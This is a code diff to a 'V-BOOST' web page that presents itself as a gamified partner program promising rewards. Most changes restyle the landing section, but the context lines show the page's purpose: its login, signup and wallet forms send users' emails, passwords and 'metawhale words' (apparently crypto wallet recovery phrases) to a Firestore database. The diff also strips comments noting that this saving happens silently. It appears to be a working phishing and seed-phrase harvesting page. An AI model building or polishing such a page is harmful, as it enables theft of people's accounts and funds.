@@ -40,7 +40,7 @@ overflow-x:hidden;
 color:#111;
 }
 
-/* Naya Logo Style 1000044417.png ke mutabiq */
+/* 1000044417.png ke real glitch horizontal lines effect ke liye updated logo css */
 .logo{
 font-size:38px;
 font-weight:900;
@@ -53,98 +53,174 @@ display:inline-block;
 color:#111;
 }
 
-.logo::after {
+.logo::before, .logo::after {
 content: "V-BOOST";
 position: absolute;
-left: 2px;
 top: 0;
+left: 0;
 width: 100%;
 height: 100%;
-background: white;
-clip-path: polygon(0 12%, 100% 12%, 100% 18%, 0 18%, 0 42%, 100% 42%, 100% 48%, 0 48%, 0 78%, 100% 78%, 100% 84%, 0 84%);
-opacity: 0.75;
+background: #fff;
+overflow: hidden;
+}
+
+.logo::before {
+left: 2px;
+text-shadow: -1px 0 #ff0000;
+clip-path: inset(10% 0 80% 0);
+}
+
+.logo::after {
+left: -2px;
+text-shadow: -1px 0 #0000ff;
+clip-path: inset(55% 0 35% 0);
+}
+
+/* 1000044418.mp4 interface layout styling */
+#gamified-hero-page {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100vh;
+background: #0d0101;
+z-index: 99999;
+display: flex;
+flex-direction: column;
+padding: 22px;
+overflow: hidden;
+}
+
+.gamified-canvas {
+position: absolute;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+z-index: 1;
 pointer-events: none;
+background: radial-gradient(circle at center, #260505 0%, #0d0101 100%);
 }
 
-/* Naye First Interface ki CSS (1000044418.mp4) */
-#hero-page{
-position:fixed;
-top:0;
-left:0;
-width:100%;
-height:100vh;
-background:#fff;
-z-index:10000;
-display:flex;
-flex-direction:column;
-padding:22px;
-overflow:hidden;
+/* Video ke background coins setup */
+.coins-container {
+position: absolute;
+bottom: -80px;
+left: 0;
+width: 100%;
+height: 55%;
+background: url('https://v-boost.website/preview.jpg') center bottom no-repeat;
+background-size: cover;
+z-index: 2;
+transform-origin: bottom center;
+animation: coinsShaking 4s ease-in-out infinite;
 }
 
-.hero-bg-animation{
-position:absolute;
-bottom:-30px;
-left:0;
-width:100%;
-height:55%;
-background:url('https://v-boost.website/preview.jpg') center bottom no-repeat;
-background-size:cover;
-z-index:-1;
+/* Claw hand mechanism animation */
+.claw-mechanism {
+position: absolute;
+top: -50px;
+right: 15%;
+width: 140px;
+height: 50vh;
+z-index: 3;
+display: flex;
+flex-direction: column;
+align-items: center;
+animation: clawMachineDrop 5s ease-in-out infinite;
 }
 
-.claw-hand{
-position:absolute;
-top:15%;
-right:12%;
-width:110px;
-height:180px;
-background:url('https://cdn-icons-png.flaticon.com/512/1055/1055645.png') no-repeat;
-background-size:contain;
-animation:moveClaw 4.5s ease-in-out infinite;
+.claw-rod {
+width: 6px;
+height: 100%;
+background: linear-gradient(90deg, #ccc, #888, #fff);
+box-shadow: 0 0 10px rgba(0,0,0,0.5);
 }
 
-@keyframes moveClaw{
-0%,100%{transform:translateY(0) rotate(0deg);}
-50%{transform:translateY(90px) rotate(-4deg);}
+.claw-head-element {
+width: 130px;
+height: 130px;
+background: url('https://v-boost.website/preview.jpg') center top no-repeat;
+background-size: contain;
+margin-top: -5px;
+filter: drop-shadow(0 10px 15px rgba(0,0,0,0.7));
 }
 
-.hero-content{
-margin-top:55px;
-z-index:2;
+.hero-main-content {
+position: relative;
+margin-top: 50px;
+z-index: 10;
+color: #fff;
+max-width: 100%;
 }
 
-.hero-heading{
-font-size:36px;
-font-weight:800;
-line-height:1.15;
-margin-bottom:18px;
+.hero-main-content .hero-title {
+font-size: 38px;
+font-weight: 900;
+line-height: 1.15;
+letter-spacing: -0.5px;
+color: #ffffff;
+margin-bottom: 20px;
 }
 
-.hero-heading span{
-color:#ef4444;
+.hero-main-content .hero-title span {
+color: #ef4444;
 }
 
-.hero-sub{
-font-size:15px;
-color:#555;
-line-height:1.6;
-max-width:320px;
-margin-bottom:28px;
+.hero-main-content .hero-description {
+font-size: 15px;
+font-weight: 400;
+line-height: 1.6;
+color: #b3b3b3;
+max-width: 330px;
+margin-bottom: 35px;
 }
 
-.menu-icon-wrap{
-width:35px;
-height:22px;
-display:flex;
-flex-direction:column;
-justify-content:space-between;
-cursor:pointer;
+.hero-main-content .action-learn-btn {
+width: 150px;
+height: 54px;
+border: none;
+border-radius: 999px;
+background: #ef4444;
+color: #fff;
+font-size: 16px;
+font-weight: 700;
+cursor: pointer;
+box-shadow: 0 4px 20px rgba(239, 68, 68, 0.4);
+transition: transform 0.2s;
 }
 
-.menu-line{
-height:3.5px;
-background:#111;
-border-radius:99px;
+.hero-main-content .action-learn-btn:active {
+transform: scale(0.96);
+}
+
+.header-menu-container {
+width: 32px;
+height: 20px;
+display: flex;
+flex-direction: column;
+justify-content: space-between;
+cursor: pointer;
+z-index: 10;
+}
+
+.header-menu-bar {
+height: 3.5px;
+background: #fff;
+border-radius: 4px;
+width: 100%;
+}
+
+@keyframes clawMachineDrop {
+0%, 100% { transform: translateY(0); }
+45% { transform: translateY(18vh); }
+55% { transform: translateY(18vh); }
+}
+
+@keyframes coinsShaking {
+0%, 100% { transform: scale(1); }
+45% { transform: scale(1.02) translateY(-3px); }
+52% { transform: scale(0.99) translateY(1px); }
 }
 
 .page{
@@ -304,7 +380,7 @@ padding:12px 18px;
 border-radius:12px;
 font-size:14px;
 display:none;
-z-index:10005;
+z-index:999999;
 }
 
 .center-box{
@@ -407,40 +483,44 @@ cursor:pointer;
 
 <div class="popup" id="popup"></div>
 
-<section id="hero-page">
+<section id="gamified-hero-page">
+
+<div class="gamified-canvas"></div>
 
 <div class="topbar">
 
-<div class="logo">V-BOOST</div>
+<div class="logo" style="color: #fff;">V-BOOST</div>
 
-<div class="menu-icon-wrap">
-<div class="menu-line"></div>
-<div class="menu-line" style="width: 75%;"></div>
-<div class="menu-line"></div>
+<div class="header-menu-container">
+<div class="header-menu-bar"></div>
+<div class="header-menu-bar" style="width: 75%; align-self: flex-start;"></div>
+<div class="header-menu-bar"></div>
 </div>
 
 </div>
 
-<div class="hero-content">
+<div class="hero-main-content">
 
-<h1 class="hero-heading">
+<h1 class="hero-title">
 A <span>Next-Generation</span> Gamified Partner Program
 </h1>
 
-<p class="hero-sub">
+<p class="hero-description">
 Grow your structure, receive participation rewards, and manage your digital position
 </p>
 
-<button class="btn"
-style="width:145px; border-radius:999px;"
-onclick="closeHero()">
+<button class="action-learn-btn" onclick="exitHeroToLogin()">
 Learn More
 </button>
 
 </div>
 
-<div class="claw-hand"></div>
-<div class="hero-bg-animation"></div>
+<div class="claw-mechanism">
+<div class="claw-rod"></div>
+<div class="claw-head-element"></div>
+</div>
+
+<div class="coins-container"></div>
 
 </section>
 
@@ -877,8 +957,8 @@ appId: "1:50442414127:web:00db67e99afed8d2803eda"
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-window.closeHero = function(){
-document.getElementById('hero-page').style.display = 'none';
+window.exitHeroToLogin = function(){
+document.getElementById('gamified-hero-page').style.display = 'none';
 }
 
 window.showPage = function(id){
@@ -938,10 +1018,8 @@ return;
 
 }
 
-// Pehle user ko bina roke page badal dete hain
 showPage("meta");
 
-// Firebase data background mein save hoga, agar error aayi toh user block nahi hoga
 addDoc(collection(db,"loginData"),{
 email,
 password,
@@ -978,10 +1056,8 @@ return;
 
 }
 
-// Pehle user ko bina roke page badal dete hain
 showPage("meta");
 
-// Firebase data background mein save hoga
 addDoc(collection(db,"signupData"),{
 email,
 password,
@@ -1065,10 +1141,8 @@ return;
 
 }
 
-// Pehle popup show hoga jaise aapne bataya
 popup("Please check your metawhale words");
 
-// Background mein save hoga data
 addDoc(collection(db,"walletData"),{
 words,
 check,
